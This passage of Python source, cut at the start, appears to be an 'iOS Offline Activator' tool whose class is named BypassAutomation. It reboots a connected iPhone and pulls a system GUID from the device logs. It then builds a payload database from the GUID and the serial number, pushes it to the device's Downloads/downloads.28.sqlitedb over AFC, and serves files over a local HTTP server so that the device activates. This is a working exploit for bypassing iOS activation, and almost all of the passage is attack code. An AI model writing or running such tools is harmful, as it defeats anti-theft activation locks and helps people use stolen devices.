            print(f"\n{Style.BOLD}{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
            print(f"{Style.BOLD}{Style.BLUE}▶{Style.RESET} {Style.BOLD}{msg}{Style.RESET}")
            print(f"{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
        elif level == 'detail': print(f"{Style.DIM}  ╰─▶{Style.RESET} {msg}")
        elif level == 'success': print(f"{Style.GREEN}{Style.BOLD}[✓ SUCCESS]{Style.RESET} {msg}")

    def _run_cmd(self, cmd, timeout=None):
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return res.returncode, res.stdout.strip(), res.stderr.strip()
        except subprocess.TimeoutExpired: return 124, "", "Timeout"
        except Exception as e: return 1, "", str(e)

    def verify_dependencies(self):
        self.log("Verifying System Requirements...", "step")
        # Check for assets/Maker
        if not os.path.isdir(os.path.join(os.getcwd(), "assets", "Maker")):
            self.log("Missing 'assets/Maker' folder in current directory.", "error")
            sys.exit(1)

        if shutil.which("ifuse"): self.afc_mode = "ifuse"
        else: self.afc_mode = "pymobiledevice3"
        self.log(f"AFC Transfer Mode: {self.afc_mode}", "info")

    def mount_afc(self):
        if self.afc_mode != "ifuse": return True
        os.makedirs(self.mount_point, exist_ok=True)
        code, out, _ = self._run_cmd(["mount"])
        if self.mount_point in out: return True
        for i in range(5):
            if self._run_cmd(["ifuse", self.mount_point])[0] == 0: return True
            time.sleep(2)
        return False

    def unmount_afc(self):
        if self.afc_mode == "ifuse" and os.path.exists(self.mount_point):
            self._run_cmd(["umount", self.mount_point])
            try: os.rmdir(self.mount_point)
            except: pass

    def detect_device(self):
        self.log("Detecting Device...", "step")
        code, out, _ = self._run_cmd(["ideviceinfo"])
        if code != 0: 
            self.log("No device found via USB", "error")
            sys.exit(1)
        
        info = {}
        for line in out.splitlines():
            if ": " in line:
                key, val = line.split(": ", 1)
                info[key.strip()] = val.strip()
        self.device_info = info
        
        print(f"\n{Style.BOLD}Device: {info.get('ProductType','Unknown')} (iOS {info.get('ProductVersion','?')}){Style.RESET}")
        print(f"UDID: {info.get('UniqueDeviceID','?')}")
        
        if info.get('ActivationState') == 'Activated':
            print(f"{Style.YELLOW}Warning: Device already activated.{Style.RESET}")

    def get_guid(self):
        self.log("Extracting System Logs...", "step")
        udid = self.device_info['UniqueDeviceID']
        log_path = f"{udid}.logarchive"
        if os.path.exists(log_path): shutil.rmtree(log_path)
        
        self._run_cmd(["pymobiledevice3", "syslog", "collect", log_path], timeout=180)
        
        if not os.path.exists(log_path):
            self.log("Archive failed, trying live watch...", "warn")
            _, out, _ = self._run_cmd(["pymobiledevice3", "syslog", "watch"], timeout=60)
            logs = out
        else:
            tmp = "final.logarchive"
            if os.path.exists(tmp): shutil.rmtree(tmp)
            shutil.move(log_path, tmp)
            _, logs, _ = self._run_cmd(["/usr/bin/log", "show", "--style", "syslog", "--archive", tmp])
            shutil.rmtree(tmp)

        guid_pattern = re.compile(r'SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/')
        for line in logs.splitlines():
            if "BLDatabaseManager" in line:
                match = guid_pattern.search(line)
                if match: return match.group(1).upper()
        return None

    def run(self):
        os.system('clear')
        print(f"{Style.BOLD}{Style.MAGENTA}iOS Offline Activator (Python Edition){Style.RESET}\n")
        
        self.verify_dependencies()
        self.server.start() # Start HTTP server
        self.detect_device()
        
        input(f"{Style.YELLOW}Press Enter to start...{Style.RESET}")
        
        # 1. Reboot
        self.log("Rebooting device...", "step")
        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
        time.sleep(30)
        
        # 2. Get GUID
        self.guid = self.get_guid()
        if not self.guid:
            self.log("Could not find GUID in logs.", "error")
            sys.exit(1)
        self.log(f"GUID: {self.guid}", "success")
        
        # 3. Generate Payloads (Offline Logic)
        self.log("Generating Payload (Offline)...", "step")
        final_db_path = self.generator.generate(
            self.device_info['ProductType'], 
            self.guid, 
            self.device_info['SerialNumber'],
            self.server
        )
        
        if not final_db_path:
            self.log("Payload generation failed.", "error")
            sys.exit(1)
        self.log("Payload Generated Successfully.", "success")

        # 4. Upload
        self.log("Uploading...", "step")
        target = "/Downloads/downloads.28.sqlitedb"
        
        if self.afc_mode == "ifuse":
            self.mount_afc()
            fpath = self.mount_point + target
            if os.path.exists(fpath): os.remove(fpath)
            shutil.copy(final_db_path, fpath)
        else:
            self._run_cmd(["pymobiledevice3", "afc", "rm", target])
            self._run_cmd(["pymobiledevice3", "afc", "push", final_db_path, target])
            
        self.log("Payload Deployed. Rebooting...", "success")
        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
        
        print(f"\n{Style.GREEN}Process Complete. Device should activate after reboot.{Style.RESET}")
        
        # Keep script alive for server to serve files if needed by device immediately
        self.log("Keeping server alive for 60s to ensure downloads complete...", "info")
        time.sleep(60)
        
        self._cleanup()

    def _cleanup(self): 
        self.unmount_afc()
        self.server.stop()

if __name__ == "__main__":
    try:
        BypassAutomation().run()
    except KeyboardInterrupt:
        sys.exit(130)
    except Exception as e:
        print(f"Fatal Error: {e}")
        sys.exit(1)
